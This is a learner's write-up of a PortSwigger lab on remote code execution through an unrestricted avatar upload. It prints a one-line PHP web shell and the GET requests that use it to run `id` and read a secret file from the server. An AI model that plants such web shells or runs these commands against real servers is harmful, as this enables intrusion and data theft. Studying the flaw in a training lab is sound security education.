# Lab 01 — Remote code execution via web shell upload

**Difficulty:** 🟢 Apprentice  
**Technique:** File Upload — no filter  
**Link:** https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-no-filter

---

## Concept

The application allows users to upload avatar images with no validation on file type or extension. By uploading a PHP web shell instead of an image, the server executes it when accessed directly via URL, enabling remote code execution.

---

## Process

### Step 1 — Create the web shell

```php
<?php echo system($_GET['command']); ?>
```

Save as `shell.php`.

### Step 2 — Upload via the avatar feature

Upload `shell.php` through the profile picture upload functionality. The server accepts it without any validation.

### Step 3 — Verify code execution

```
GET /files/avatars/shell.php?command=id HTTP/2
```

**Result:** server returns the output of `id`, confirming RCE.

### Step 4 — Exfiltrate the secret

```
GET /files/avatars/shell.php?command=cat+/home/carlos/secret HTTP/2
```

**Result:** secret file contents returned — lab solved.

---

## Issues encountered

Initially passed the command with double quotes (`command="id"`). The quotes are interpreted as part of the string, causing the command to fail silently. Correct syntax is without quotes: `command=id`.

---

## Takeaways

- Without file type validation, any file including `.php` is accepted
- The server executes PHP files when accessed directly via URL
- Spaces in commands must be URL-encoded as `+` or `%20`
- Don't wrap commands in quotes when passing via GET parameter
- Uploaded files are served from `/files/avatars/` — knowing the path is key to triggering execution

---

## References

- [File Upload Vulnerabilities — PortSwigger](https://portswigger.net/web-security/file-upload)
